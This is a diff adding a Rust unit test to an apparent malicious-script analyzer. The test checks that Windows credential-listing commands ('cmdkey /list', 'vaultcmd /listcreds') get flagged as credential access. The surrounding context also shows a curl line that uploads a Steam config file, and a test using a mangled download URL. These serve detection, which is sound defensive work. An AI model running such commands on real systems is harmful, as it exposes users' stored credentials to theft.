@@ -21990,6 +21990,25 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn credential_manager_listing_emits_credential_access_trait() {
+        let script = br#"cmdkey /list
+vaultcmd /listcreds:"Windows Credentials"
+"#;
+        let report = analyze(script, &Config::default());
+
+        for technique in ["credential-manager-list", "vaultcmd-listcreds"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::CredentialAccess { technique: existing, .. } if existing == technique
+                )),
+                "missing {technique}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn mangled_short_webclient_de_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "http://tvde.m/e/pt.zp";
